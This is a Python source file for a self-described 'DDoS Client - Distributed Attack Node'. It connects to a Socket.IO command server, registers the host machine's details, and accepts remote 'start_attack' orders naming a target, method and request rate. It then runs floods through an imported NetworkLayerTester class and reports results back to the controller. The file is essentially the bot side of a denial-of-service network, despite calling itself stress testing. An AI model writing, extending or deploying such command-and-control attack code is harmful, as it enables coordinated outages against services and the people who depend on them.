import socketio
import requests
import psutil
import platform
import time
import json
import threading
import subprocess
import sys
import os
from datetime import datetime

# Add the parent directory to path to import tool
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# Import the stress testing tool
from tool import NetworkLayerTester, print_banner

class DDoSClient:
    def __init__(self, server_url='http://localhost:5000', client_name=None):
        self.server_url = server_url
        self.client_name = client_name or f"{platform.node()}_{platform.system()}"
        self.sio = socketio.SimpleClient()
        self.current_attack = None
        self.attack_thread = None
        self.running = False
        
        # Setup event handlers
        self.setup_handlers()
        
        # Client information
        self.client_info = {
            'name': self.client_name,
            'hostname': platform.node(),
            'platform': platform.platform(),
            'cpu_count': psutil.cpu_count(),
            'memory_total': psutil.virtual_memory().total,
            'python_version': platform.python_version(),
            'start_time': datetime.now().isoformat()
        }
    
    def setup_handlers(self):
        """Setup SocketIO event handlers"""
        @self.sio.event
        def connect():
            print(f"✅ Connected to server: {self.server_url}")
            self.register_client()
        
        @self.sio.event
        def connect_error(data):
            print(f"❌ Connection failed: {data}")
        
        @self.sio.event
        def disconnect():
            print("❌ Disconnected from server")
            self.running = False
        
        @self.sio.event
        def welcome(data):
            print(f"📢 Server: {data['message']}")
        
        @self.sio.event
        def registration_success(data):
            print(f"✅ Registered as client: {data['client_id']}")
        
        @self.sio.event
        def start_attack(data):
            print(f"🎯 Received attack command: {data['attack_id']}")
            print(f"   Target: {data['config']['target']}")
            print(f"   Method: {data['config']['method']}")
            print(f"   Layer: {data['config']['layer']}")
            
            self.current_attack = data['attack_id']
            self.start_attack_execution(data['attack_id'], data['config'])
        
        @self.sio.event
        def stop_attack(data):
            print(f"🛑 Stopping attack: {data['attack_id']}")
            self.stop_attack_execution()
    
    def register_client(self):
        """Register client with server"""
        self.sio.emit('client_register', self.client_info)
    
    def send_stats(self, stats):
        """Send client statistics to server"""
        if self.sio.connected:
            self.sio.emit('client_stats', stats)
    
    def send_attack_progress(self, attack_id, progress_data):
        """Send attack progress to server"""
        if self.sio.connected:
            self.sio.emit('attack_progress', {
                'attack_id': attack_id,
                **progress_data
            })
    
    def send_attack_complete(self, attack_id, results):
        """Notify server that attack is complete"""
        if self.sio.connected:
            self.sio.emit('attack_complete', {
                'attack_id': attack_id,
                **results
            })
    
    def send_attack_error(self, attack_id, error):
        """Notify server about attack error"""
        if self.sio.connected:
            self.sio.emit('attack_error', {
                'attack_id': attack_id,
                'error': str(error)
            })
    
    def start_attack_execution(self, attack_id, config):
        """Start attack execution in a separate thread"""
        if self.attack_thread and self.attack_thread.is_alive():
            print("⚠️ Another attack is already running")
            return
        
        self.running = True
        self.attack_thread = threading.Thread(
            target=self.execute_attack,
            args=(attack_id, config),
            daemon=True
        )
        self.attack_thread.start()
    
    def execute_attack(self, attack_id, config):
        """Execute the attack using the stress testing tool"""
        try:
            print("\n" + "="*60)
            print(f"🚀 Starting attack on: {config['target']}")
            print(f"🔧 Configuration: {config}")
            print("="*60 + "\n")
            
            # Create NetworkLayerTester instance
            tester = NetworkLayerTester(
                target=config['target'],
                target_type=config['layer'],
                requests_per_second=config.get('rps', 100),
                duration=config.get('duration', 60),
                use_proxy=config.get('use_proxy', False),
                proxy_config=None  # Can be configured from proxy_list
            )
            
            # Start time
            start_time = time.time()
            
            # Execute based on method
            method = config.get('method', 'burst').lower()
            
            if method == 'surgical':
                # Rate limited execution
                tester.rate_limited_executor()
            elif method == 'tactical':
                # Multi-method attack
                tester.multi_method_attack(duration=config.get('duration', 60))
            elif method == 'nuclear':
                # All methods
                tester.burst_mode(burst_size=1000)
            else:
                # Default burst mode
                tester.execute_enhanced_attack()
            
            # Calculate results
            elapsed = time.time() - start_time
            total_requests = len(tester.results) if hasattr(tester, 'results') else 0
            successful = len([r for r in tester.results if r.get('success', False)]) if hasattr(tester, 'results') else 0
            
            # Send final results
            self.send_attack_complete(attack_id, {
                'total_requests': total_requests,
                'successful_requests': successful,
                'failed_requests': total_requests - successful,
                'duration': elapsed,
                'average_rps': total_requests / elapsed if elapsed > 0 else 0
            })
            
            print(f"\n✅ Attack completed: {total_requests} requests in {elapsed:.2f}s")
            print(f"   Success rate: {(successful/total_requests*100):.1f}%")
            
        except KeyboardInterrupt:
            print("\n🛑 Attack interrupted by user")
            self.send_attack_error(attack_id, "Interrupted by user")
        except Exception as e:
            print(f"\n❌ Attack error: {str(e)}")
            self.send_attack_error(attack_id, str(e))
        finally:
            self.running = False
            self.current_attack = None
    
    def stop_attack_execution(self):
        """Stop the current attack"""
        self.running = False
        if self.attack_thread and self.attack_thread.is_alive():
            self.attack_thread.join(timeout=5)
        self.current_attack = None
        print("✅ Attack stopped")
    
    def monitor_and_report(self):
        """Monitor system stats and report to server"""
        while True:
            try:
                if self.sio.connected:
                    # Get system stats
                    cpu_usage = psutil.cpu_percent(interval=1)
                    memory_usage = psutil.virtual_memory().percent
                    
                    stats = {
                        'cpu_usage': cpu_usage,
                        'memory_usage': memory_usage,
                        'timestamp': datetime.now().isoformat()
                    }
                    
                    self.send_stats(stats)
                
                time.sleep(2)  # Report every 2 seconds
            except Exception as e:
                print(f"Error in monitor: {e}")
                time.sleep(5)
    
    def connect(self):
        """Connect to server and start monitoring"""
        try:
            print("🔗 Connecting to server...")
            self.sio.connect(self.server_url)
            
            # Start monitoring thread
            monitor_thread = threading.Thread(target=self.monitor_and_report, daemon=True)
            monitor_thread.start()
            
            # Keep the client running
            while True:
                time.sleep(1)
                
        except KeyboardInterrupt:
            print("\n🛑 Client stopped by user")
            self.disconnect()
        except Exception as e:
            print(f"❌ Connection error: {str(e)}")
            self.disconnect()
    
    def disconnect(self):
        """Disconnect from server"""
        self.stop_attack_execution()
        if self.sio.connected:
            self.sio.disconnect()
        sys.exit(0)

def main():
    """Main function"""
    print_banner()
    
    print("\n" + "="*60)
    print("🤖 DDoS Client - Distributed Attack Node")
    print("="*60)
    
    # Get server URL
    server_url = input("\n🌐 Enter server URL (default: http://localhost:5000): ").strip()
    if not server_url:
        server_url = "http://localhost:5000"
    
    # Get client name
    client_name = input("🏷️  Enter client name (optional): ").strip()
    
    print(f"\n📡 Connecting to: {server_url}")
    print("⚡ Press Ctrl+C to disconnect\n")
    
    # Create and run client
    client = DDoSClient(server_url=server_url, client_name=client_name)
    client.connect()

if __name__ == "__main__":

    main()
